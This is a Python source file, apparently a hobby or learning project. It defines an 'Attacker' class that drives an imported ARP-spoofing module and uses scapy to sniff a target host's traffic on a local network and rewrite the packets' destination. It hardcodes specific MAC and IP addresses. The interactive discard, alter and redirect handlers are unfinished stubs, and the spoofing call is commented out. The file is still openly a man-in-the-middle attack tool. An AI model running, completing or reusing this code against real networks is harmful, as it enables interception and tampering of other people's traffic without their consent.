from Spoofer import Spoofer
import scapy.all as scapy
import time


class Attacker:
    # for testing in EranKO
    # destinationMac = '14-10-9F-E1-65-61'
    # sourceMAC = '0C-9D-92-82-9F-26'
    # targetIP = '192.168.1.34'
    # gatewayIP = '192.168.1.1' == spoof ip

    def __init__(self, destination_mac='14-10-9F-E1-65-61', source_mac='0C-9D-92-82-9F-26', gateway_ip='192.168.1.1', target_ip='192.168.1.34'):
        self.destinationMac = destination_mac
        self.sourceMAC = source_mac
        self.gatewayIP = gateway_ip
        self.targetIP = target_ip
        self.s = Spoofer(self.destinationMac, self.sourceMAC, self.gatewayIP, self.targetIP)

    def spoof(self):
        """This Func with the usage of the spoofer class will spoof and restore"""
        self.s.main()  # this will use spoof and stop_spoof in spoofer

        print("spoofing stopped by attacker")
        self.s.restore(self.targetIP, self.gatewayIP)
        self.s.restore(self.gatewayIP, self.targetIP)

    def stop_traffic(self, packet):
        print(packet[0][1].dst)
        packet[0][1].dst = self.targetIP  # reroutes the packet to the owner later to be changed to trash address
        # print(packet[0][1].dst)

    def packet_interact(self, packet):
        """This Func will either discard alter or let the packet go depending on input"""
        # TODO: before action i need to build the packet and present it to the attacker maybe packet.summary()?
        print(packet.summary)
        regex = " |"  # maybe can remodel to another input in the action themselves
        action = input("Desired action: ")  # block function
        if action == "Help" or action == "help":
            print("Discard -> destroy the packet")
            print("Alter -> change the value of the packet then send it to same address")
            print("Redirect -> send the same packet to another ip")
            print("RedirectA -> change the value of the packet then send the packet to another ip")
            print("If nothing is entered the packet will go to the desired address")
        action = action.split(regex)
        if action[0] == "Discard":  # destroy the packet
            pass
        if action[0] == "Alter":  # change the value of the packet then send it to same address
            pass
        if action[0] == "Redirect":  # send the same packet to another ip
            pass
        if action[0] == "RedirectA":  # change the value of the packet then send the packet to another ip
            pass
        else:
            print("y?")
        pass

    def harvest_packets(self):
        """This Func will present the relevant network traffic"""
        # sniff() uses Berkeley Packet Filter (BPF) syntax
        filter_param = "host" + " " + self.targetIP  # This will be the filter for the scapy that runs from attacker pc
        while 'sniffing':  # need to check if default sniff is own PC
            pkt = scapy.sniff(filter=filter_param, count=1, prn=self.stop_traffic)  # filter will use self.target_ip
            # prn is  what func to apply to each packet
            # print(pkt[0])
            time.sleep(0.5)

    def main(self):
        """Main function of the Attacker"""
        # self.spoof()
        # input("begin?")
        self.harvest_packets()


a = Attacker(target_ip="192.168.1.36")
a.main()
